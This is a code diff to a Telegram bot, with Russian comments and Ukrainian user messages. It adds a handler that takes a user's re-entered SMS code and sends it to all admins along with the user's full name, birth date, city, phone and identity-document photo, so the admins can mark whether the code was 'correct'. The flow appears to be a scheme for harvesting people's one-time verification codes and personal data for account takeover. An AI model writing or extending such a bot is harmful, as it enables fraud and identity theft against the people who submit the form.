@@ -179,7 +179,7 @@ async def verify_code_yes(callback: types.CallbackQuery, bot: Bot):
 async def verify_code_no(callback: types.CallbackQuery, bot: Bot):
     form_id = int(callback.data.split("_")[-1])
     
-    # Обновляем статус в БД
+    # Обновляем статус в БД (0 = отклонено, ожидание повторного ввода)
     verify_code(form_id, False)
     
     # Получаем данные анкеты
@@ -199,3 +199,54 @@ async def verify_code_no(callback: types.CallbackQuery, bot: Bot):
     await callback.message.edit_caption(
         caption=callback.message.caption + "\n\n❌ <b>КОД ВІДХИЛЕНО</b>"
     )
+
+# --- Обработчик повторного ввода кода (без состояния) ---
+@router.message(F.text)
+async def handle_code_retry(message: types.Message, bot: Bot):
+    user_id = message.from_user.id
+    
+    # Проверяем, есть ли у пользователя анкета с code_verified = 0 (отклоненный код)
+    user_data = get_user_data(user_id)
+    
+    if user_data and user_data.get('code_verified') == 0:
+        code = message.text.strip()
+        
+        # Сохраняем новый код
+        save_sms_code(user_id, code)
+        
+        # Отправляем уведомление администраторам
+        admins = get_all_admins()
+        
+        form_text = (
+            f"📋 <b>Повторний ввод коду!</b>\n\n"
+            f"👤 User ID: <code>{user_data['user_id']}</code>\n"
+            f"📱 Username: @{user_data['username']}\n\n"
+            f"<b>Дані анкети:</b>\n"
+            f"ПІБ: {user_data['full_name']}\n"
+            f"Дата народження: {user_data['age']}\n"
+            f"Місто: {user_data['city']}\n"
+            f"Телефон: {user_data['phone']}\n"
+            f"Площа житла: {user_data['email']}\n\n"
+            f"🔐 <b>Введений код:</b> <code>{code}</code>"
+        )
+        
+        from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
+        keyboard = InlineKeyboardMarkup(inline_keyboard=[
+            [
+                InlineKeyboardButton(text="✅ Правильно введен код", callback_data=f"verify_yes_{user_data['form_id']}"),
+                InlineKeyboardButton(text="❌ Неправильно введен код", callback_data=f"verify_no_{user_data['form_id']}")
+            ]
+        ])
+        
+        for admin_id, admin_username in admins:
+            try:
+                await bot.send_photo(
+                    chat_id=admin_id,
+                    photo=user_data['document_photo'],
+                    caption=form_text,
+                    reply_markup=keyboard
+                )
+            except Exception as e:
+                print(f"Не удалось отправить уведомление админу {admin_id}: {e}")
+        
+        await message.answer("⏳ Ваш код отримано. Очікуйте перевірки адміністратором.")
